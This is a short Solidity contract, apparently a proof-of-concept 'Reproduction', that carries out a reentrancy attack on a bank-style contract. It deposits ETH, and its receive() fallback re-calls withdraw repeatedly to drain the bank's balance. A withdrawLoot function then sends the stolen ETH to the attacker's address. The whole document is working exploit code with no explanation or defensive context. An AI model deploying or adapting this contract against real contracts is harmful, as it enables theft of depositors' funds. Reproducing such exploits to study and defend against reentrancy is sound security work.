interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    IBank public bank;
    address public attacker;

    constructor(address _bank) {
        bank = IBank(_bank);
        attacker = msg.sender;
    }

    function begin() external payable {
        require(msg.sender == attacker, "Only attacker");
        require(msg.value > 0, "Must send ETH");
        depositToBank();
    }

    function depositToBank() internal {
        bank.deposit{value: msg.value}();
    }

    function launchAttack(uint value) external {
        require(msg.sender == attacker, "Unauthorized");
        bank.withdraw(value);
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw(msg.value);
        }
    }

    function withdrawLoot() external {
        require(msg.sender == attacker, "Only attacker");
        sendAll();
    }

    function sendAll() internal {
        payable(attacker).transfer(address(this).balance);
    }
}